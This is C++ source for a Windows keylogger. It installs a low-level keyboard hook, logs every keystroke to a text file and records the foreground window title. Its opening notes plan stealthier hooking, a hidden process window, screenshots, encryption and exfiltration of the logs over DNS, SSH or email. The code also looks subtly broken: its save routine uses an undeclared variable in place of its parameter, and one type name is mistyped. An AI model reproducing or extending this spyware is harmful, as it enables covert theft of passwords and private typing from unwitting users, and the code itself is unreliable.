/* References:
 - Catch Tests: https://github.com/philsquared/Catch
 - Better WinAPI reference: https://www.unknowncheats.me/forum/c-and-c/83707-setwindowshookex-example.html
*/

/* NOTES:
Currently dead simple. Areas for improvement:
 - Less detectable method of hooking user key presses (super high CPU usage with infinite loop right now)
 - We really should be hooking Windows API (SetWindowsHookEx) here instead of making the calls we do
 - Grab screenshot of areas around cursor when clicking
 - Get Window title of where text was typed. Gives context into keys logged
 - Exfiltrate data over DNS, SSH, email, something like that
 - Encrypt data before it is sent out/logged
 - Don't open the file a billion times per second to read/write
 - Use something like this:

 char cWindow[MAX_PATH];
 GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));

 to get the text of the window being typed in (in cWindow)

*/

#include "stdafx.h"
#include "public.h"
#define CATCH_CONFIG_RUNNER
#include "catch.hpp"

using namespace std;

// Global handle to the keyboard hook
HHOOK _hook;

// Data structure for the data received by hook
KBDLLHOOKSTRUCT kbdStruct;


int main(int argc, char* argv[])
{

	// New Catch sessions for running our tests in test.cpp
	//Catch::Session session; // There must be exactly one instance
	//int returnCode = session.applyCommandLine(argc, argv);
	//if (returnCode != 0) // Indicates a command line error
	//return returnCode;

	// Run the unit tests
	//int numFailed = session.run();

	/* Note that on unices only the lower 8 bits are usually used, clamping
	the return value to 255 prevents false negative when some multiple
	of 256 tests has failed */

	//return (numFailed < 0xff ? numFailed : 0xff);

	// Enable hook
	SetHook();
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}

	//HWND hwnd = GetConsoleWindow();
	//AllocConsole();
	//hwnd = FindWindowA("ConsoleWindowClass", NULL);
	// Don't show the process window
	//ShowWindow(hwnd, 0);

}
// Callback function for kb. Called when a key is pressed
LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
	// If it's a valid nCode
	if (nCode >= 0) {
		// If we detect a key press
		if (wParam == WM_KEYDOWN) {
			// Dereference into our struct and grab lparam in it.
			// it's the pointer to the data from the keyboard callback
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			// Need to add big case table for keypress.
			// For now we just detect spacebar being pressed
			Save(kbdStruct.vkCode, "keys.txt");
			if (kbdStruct.vkCode == VK_SPACE)
			{
				// User pressed spacebar, display message box for now.
				// TODO: write this to a file
				// char array to store the name of the window in which we captured a key
				char cWindow[MAX_PATH];
				// Grab the name of the current window, store it in cWindow
				GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
				// Do some Windows black magic to convert char* to LPCWSTR
				std:wstring widestring;
				for (int i = 0; i < (int)strlen(cWindow); i++)
					widestring += (wchar_t)cWindow[i];
				LPCWSTR str = widestring.c_str();

				// Include the "str" cWindow name in the title field of the message box
				MessageBox(NULL, _T("Spacebar pressed."), str, MB_ICONINFORMATION);
			}
		}
	}
	 
	// Call the next hook in the chain
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL sets a low level keyboard hook.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0))) {
		// Show error with "Error" icon. . . Hook failed to set for some reason
		MessageBox(NULL, _T("Hook not set."), _T("Error"), MB_ICONERROR);
	}
}

void ReleaseHook() {
	// Free the hook
	UnhookWindowsHookEx(_hook);
}



int Save(DWORD vkCode, char *file)   // Here we define our save function that we declared before.
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	if (key_stroke == 8)  // The numbers stands for the ascii value of a character
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");  // This will print [BACKSPACE] when key 8 is pressed. All the code under this works the same.
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "\n"); // This will make a newline when the enter key is pressed.
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)              //VK stands for virtual key wich are the keys like Up arrow, down arrow..
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);

	fclose(OUTPUT_FILE);
	return 0;
}



